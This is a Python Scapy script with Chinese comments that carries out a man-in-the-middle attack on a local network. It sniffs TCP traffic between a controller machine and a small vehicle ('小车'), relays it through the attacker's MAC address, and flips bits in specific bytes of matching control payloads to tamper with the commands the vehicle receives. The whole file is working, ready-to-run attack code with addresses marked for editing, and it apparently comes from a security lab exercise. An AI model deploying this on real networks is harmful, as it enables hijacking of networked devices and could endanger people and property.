from scapy.all import *              # 导入 Scapy 库的所有模块，用于构造、发送和嗅探网络数据包
import numpy as np                   # 导入 NumPy 库，用于数值计算（当前代码未直接使用）

IP_A = "192.168.1.199"              # 定义控制机的 IP 地址（需要根据实际情况修改）
IP_B = "192.168.1.112"              # 定义小车的 IP 地址（需要根据实际情况修改）
MAC_A = '00:0c:29:06:59:89'         # 定义控制机的 MAC 地址（需要根据实际情况修改）
MAC_B = 'b8:27:eb:9e:0d:4b'         # 定义小车的 MAC 地址（需要根据实际情况修改）
MAC_M = '00:0c:29:07:36:d1'         # 定义攻击机的 MAC 地址（需要根据实际情况修改）

def spoof_pkt(pkt):                # 定义用于处理捕获数据包的函数 spoof_pkt，参数 pkt 为捕获的数据包对象
    try:
        if(pkt.src == MAC_M):       # 如果数据包的源 MAC 地址为攻击机自身，则不作处理（防止重复处理自己发送的数据包）
            return
        if(pkt[IP].src == IP_A and pkt[IP].dst == IP_B):  # 如果数据包来自控制机并发送给小车
            pkt.src = MAC_M       # 修改数据包源 MAC 地址为攻击机的 MAC，伪造源地址
            pkt.dst = MAC_B       # 修改数据包目标 MAC 地址为小车的 MAC
            Bytes = pkt[TCP].load  # 获取数据包中 TCP 层的负载数据
            if(Bytes[0:4] == b'\x30\x00\x00\x00'):  # 如果 TCP 负载前4个字节匹配特定的字节序列（用于特定检测）
                pkt.show()        # 显示数据包内容（调试用途）
                i = len(Bytes)    # 获取 TCP 负载的长度（此变量 i 在后续未使用）
                temp = bytearray(Bytes)   # 将 TCP 负载转换为可修改的字节数组
                temp[11] = (int(Bytes[11]) ^ (8 * 16))  # 对 TCP 负载第12个字节进行异或操作，修改数据内容
                temp[51] = (int(Bytes[51]) ^ (8 * 16))  # 对 TCP 负载第52个字节进行异或操作，修改数据内容
                Bytes = bytes(temp)  # 将修改后的字节数组转换回 bytes 类型
                pkt[TCP].load = Bytes  # 更新数据包的 TCP 负载为修改后的内容
                pkt.show()        # 再次显示数据包内容（调试用途）
        elif(pkt[IP].src == IP_B and pkt[IP].dst == IP_A):  # 如果数据包来自小车并发送给控制机
            pkt.src = MAC_M       # 修改数据包的源 MAC 地址为攻击机的 MAC
            pkt.dst = MAC_A       # 修改数据包的目标 MAC 地址为控制机的 MAC
        del(pkt.chksum)             # 删除 IP 层的校验和，迫使 Scapy 重新计算校验和
        del(pkt[TCP].chksum)        # 删除 TCP 层的校验和，迫使 Scapy 重新计算校验和
        pkt.show()                  # 显示最终处理后的数据包（调试用途）
        sendp(pkt)                  # 通过 Layer2 发送修改后的数据包
    except Exception as e:          # 捕获处理数据包时可能出现的异常
        print("[-] Error = " + str(e))  # 输出错误信息
        if(pkt.type != 2054 and str(e) != "load"):  # 如果数据包类型不是 ARP（类型2054）并且错误信息不为 "load"
            pkt.show()            # 显示数据包内容（调试用途）
        try:
            sendp(pkt)            # 尝试发送数据包，即使处理过程中出现异常
        except Exception as e2:
            pass                  # 如果再次发送时发生异常，则忽略

f = "host " + IP_A + " and host " + IP_B + " and tcp"  # 构造 BPF 过滤表达式，仅捕获 IP_A 与 IP_B 之间的 TCP 数据包
pkt = sniff(filter=f, iface='ens33', prn=spoof_pkt)  # 启动数据包嗅探，在指定网卡 'ens33' 上捕获符合过滤条件的数据包，并调用 spoof_pkt 函数处理